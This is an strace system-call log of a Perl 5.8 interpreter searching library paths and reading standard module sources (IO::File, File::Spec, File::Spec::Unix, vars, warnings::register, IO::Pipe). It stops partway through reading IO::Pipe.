7464  07:18:53.256109 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
7464  07:18:53.265906 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
7464  07:18:53.265962 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d93000
7464  07:18:53.265993 mmap2(0xb7d96000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d96000
7464  07:18:53.266024 close(8)          = 0
7464  07:18:53.266329 read(6, "", 4096) = 0
7464  07:18:53.266363 close(6)          = 0
7464  07:18:53.266489 stat64("/etc/perl/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266524 stat64("/etc/perl/IO/File.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266539 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266552 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266580 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266592 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266606 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266617 stat64("/usr/lib/perl5/IO/File.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266630 stat64("/usr/share/perl5/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266642 stat64("/usr/share/perl5/IO/File.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266655 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.266668 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
7464  07:18:53.266689 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.266703 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.266715 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.266732 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
7464  07:18:53.267059 stat64("/etc/perl/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267077 stat64("/etc/perl/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267090 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267103 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267117 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267129 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267143 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267155 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267168 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267180 stat64("/usr/share/perl5/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267193 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267205 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267219 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267232 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
7464  07:18:53.267253 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.267267 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.267278 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.267296 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
7464  07:18:53.267373 stat64("/etc/perl/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267401 stat64("/etc/perl/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267475 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267490 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267504 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267518 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267546 stat64("/usr/lib/perl5/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267558 stat64("/usr/lib/perl5/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267571 stat64("/usr/share/perl5/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267582 stat64("/usr/share/perl5/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267595 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267607 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfa6c57c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267620 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfa6c66c) = -1 ENOENT (No such file or directory)
7464  07:18:53.267632 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
7464  07:18:53.267652 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
7464  07:18:53.267666 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c388) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.267677 _llseek(10, 0, [0], SEEK_CUR) = 0
7464  07:18:53.267694 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
7464  07:18:53.267807 stat64("/etc/perl/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267821 stat64("/etc/perl/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267835 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267848 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267862 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267892 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267934 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267961 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267976 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.267989 stat64("/usr/share/perl5/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.268004 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.268017 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfa6c0cc) = -1 ENOENT (No such file or directory)
7464  07:18:53.268032 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfa6c1bc) = -1 ENOENT (No such file or directory)
7464  07:18:53.268059 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
7464  07:18:53.268080 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
7464  07:18:53.268095 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6bed8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.268106 _llseek(11, 0, [0], SEEK_CUR) = 0
7464  07:18:53.268124 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
7464  07:18:53.268268 read(11, "", 4096) = 0
7464  07:18:53.268281 close(11)         = 0
7464  07:18:53.268516 _llseek(10, 1148, [1148], SEEK_SET) = 0
7464  07:18:53.268533 _llseek(10, 0, [1148], SEEK_CUR) = 0
7464  07:18:53.268543 close(10)         = 0
7464  07:18:53.268611 _llseek(8, 594, [594], SEEK_SET) = 0
7464  07:18:53.268625 _llseek(8, 0, [594], SEEK_CUR) = 0
7464  07:18:53.268635 close(8)          = 0
7464  07:18:53.268668 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268683 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268697 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268710 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268724 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268736 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268750 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268762 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268776 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268788 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268801 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268814 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.268845 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.276301 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
7464  07:18:53.276302 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.276302 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.276302 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.276302 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
7464  07:18:53.276743 brk(0x8218000)    = 0x8218000
7464  07:18:53.276872 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
7464  07:18:53.277318 read(8, "", 4096) = 0
7464  07:18:53.277337 close(8)          = 0
7464  07:18:53.277810 read(6, "", 4096) = 0
7464  07:18:53.277862 close(6)          = 0
7464  07:18:53.278347 stat64("/etc/perl/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278365 stat64("/etc/perl/IO/Pipe.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278400 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278429 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278445 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278458 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278472 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278485 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278511 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278523 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278535 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.278548 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
7464  07:18:53.278569 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.278583 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.278594 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.278615 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), 